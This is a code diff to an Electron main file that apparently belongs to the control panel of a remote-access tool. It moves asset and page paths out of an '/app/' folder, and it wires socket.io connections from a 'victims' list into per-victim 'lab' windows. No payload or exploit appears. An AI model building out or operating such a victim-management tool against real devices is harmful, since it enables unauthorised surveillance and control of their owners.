@@ -8,7 +8,7 @@ var IO;
 var windows = {};
 var io = require('socket.io');
 var geoip = require('geoip-lite');
-var victimsList = require('./app/assets/javascripts/models/victims');
+var victimsList = require('./assets/javascripts/models/victims');
 module.exports = victimsList;
 
 function createWindow() {
@@ -20,10 +20,10 @@ function createWindow() {
     frame: false,
     resizable: false,
     alwaysOnTop: true,
-    icon: __dirname + '/app/assets/images/icon.ico',
+    icon: __dirname + '/assets/images/icon.ico',
   });
 
-  splashWindow.loadURL('file://' + __dirname + '/app/splash.html');
+  splashWindow.loadURL('file://' + __dirname + '/splash.html');
 
   splashWindow.webContents.on('did-finish-load', function() {
     splashWindow.show();
@@ -40,11 +40,11 @@ function createWindow() {
     center: true,
     minWidth: 1024,
     minHeight: 768,
-    icon: __dirname + '/app/assets/images/icon.ico',
+    icon: __dirname + '/assets/images/icon.ico',
   });
 
   mainWindow.setMenu(null);
-  mainWindow.loadURL('file://' + __dirname + '/app/index.html');
+  mainWindow.loadURL('file://' + __dirname + '/index.html');
 
   mainWindow.on('closed', function() {
     mainWindow = null;
@@ -118,14 +118,14 @@ ipcMain.on('openLabWindow', function(e, page, index) {
     minWidth: 1024,
     minHeight: 768,
     parent: mainWindow,
-    icon: __dirname + '/app/assets/images/icon.ico',
+    icon: __dirname + '/assets/images/icon.ico',
   });
 
   windows[index] = child.id;
   child.webContents.victim = victimsList.getVictim(index).socket;
 
   child.setMenu(null);
-  child.loadURL('file://' + __dirname + '/app/' + page);
+  child.loadURL('file://' + __dirname + '/' + page);
 
   child.once('ready-to-show', function() {
     child.show();
